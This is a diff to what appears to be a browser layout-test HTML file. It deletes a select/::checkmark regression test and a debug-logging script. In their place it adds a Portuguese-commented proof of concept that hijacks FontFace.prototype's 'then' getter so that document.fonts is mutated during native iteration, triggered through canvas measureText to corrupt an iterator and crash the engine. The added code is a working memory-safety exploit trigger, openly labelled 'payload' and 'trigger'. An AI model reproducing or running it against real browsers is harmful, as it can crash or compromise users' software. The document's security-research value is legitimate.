@@ -1,50 +1,38 @@
+
 <!DOCTYPE html>
 <html>
-<head>
-<script>
-(function(){const logElement=document.createElement('pre');logElement.id='debug-log';logElement.style.cssText='position: fixed; bottom: 0; left: 0; width: 100%; max-height: 220px; overflow-y: auto; background: rgba(0, 0, 0, 0.85); color: #ff5555; font-family: monospace; font-size: 11px; z-index: 999999; padding: 8px; box-sizing: border-box; margin: 0; border-top: 2px solid #ff0000; text-align: left; white-space: pre-wrap; word-break: break-all;';if(document.body){document.body.appendChild(logElement);}else{document.addEventListener('DOMContentLoaded',()=>document.body.appendChild(logElement));}function log(msg,color='#ff5555'){if(!logElement)return;const line=document.createElement('div');line.style.color=color;line.textContent=msg;logElement.appendChild(line);logElement.scrollTop=logElement.scrollHeight;}window.onerror=function(message,source,lineno,colno,error){log(`[ERRO JS] ${message}\n  -> ${source}:${lineno}:${colno}`);};window.addEventListener('error',function(event){const target=event.target;if(target&&(target.tagName||target===window)){const tagName=target.tagName?target.tagName.toLowerCase():'recurso';const sourceUrl=target.src||target.href||'desconhecido';log(`[FALHA RECURSO/${tagName}] N�o foi poss�vel carregar: ${sourceUrl}`,'#ffaa00');}},true);window.addEventListener('unhandledrejection',function(event){log(`[PROMISE REJECTION] ${event.reason}`);});['log','error','warn','info'].forEach(method=>{const original=console[method];console[method]=function(...args){original.apply(console,args);const text=args.map(arg=>{if(typeof arg==='object'){try{return JSON.stringify(arg);}catch(e){return '[Objeto Circular]';}}return arg;}).join(' ');let color='#ffffff';if(method==='error')color='#ff5555';if(method==='warn')color='#ffaa00';log(`[Console.${method}] ${text}`,color);};});log('[Debug Ativo]','#00ff00');})();
-</script>
-<script src="resources/js-test.js"></script>
-<style>
-select, ::picker(select) {
-    appearance: base-select;
-}
-
-/* Give the picker a renderer without opening it. */
-::picker(select) {
-    display: block;
-}
-
-/* Make the ::checkmark a block sibling of the option's text, so the text ends
-   up in an anonymous block wrapper. */
-select option, select option::checkmark {
-    display: block;
-}
-
-select option:not(:checked)::checkmark {
-    content: ".";
-}
-</style>
-</head>
 <body>
-<select id="select">
-    <option>One</option>
-    <option>Two</option>
-</select>
 <script>
-description("Recreating ::checkmark must not crash when destroying the old one collapses the anonymous block wrapping the option's text.");
+// 1. Cria a face e a coloca no FontFaceSet (fica no estado "unloaded")
+var face = new FontFace('CrashFam', 'local(Helvetica)');
+document.fonts.add(face);
+void face.loaded; // Arma a armadilha para resolver a promise
 
-const select = document.getElementById("select");
+var canvas = document.createElement('canvas');
+var ctx = canvas.getContext('2d');
+var fired = false;
 
-jsTestIsAsync = true;
+// 2. Instala o getter que sequestra a notificação de status
+Object.defineProperty(FontFace.prototype, 'then', {
+    configurable: true,
+    get: function() {
+        if (fired) return undefined;
+        fired = true;
+        
+        // 3. O Payload: Muta o HashSet de fontes do documento.
+        // Adicionar uma nova FontFace força o rehash da tabela hash interna
+        // enquanto o C++ ainda está iterando sobre ela.
+        document.fonts.add(new FontFace('Unrelated_' + Date.now(), 'local("x")'));
+        
+        return undefined;
+    }
+});
 
-(async () => {
-    await new Promise(requestAnimationFrame);
-    select.value = "Two";
-    document.body.offsetHeight;
-    shouldBe('select.value', '"Two"');
-    finishJSTest();
-})();
+// 4. O GATILHO: Força o carregamento e a resolução síncrona.
+// O C++ pausa, roda o getter, a tabela hash é realocada, 
+// e o C++ retoma com o iterador corrompido -> CRASH.
+ctx.font = '10px CrashFam';
+ctx.measureText('a');
 </script>
 </body>
 </html>
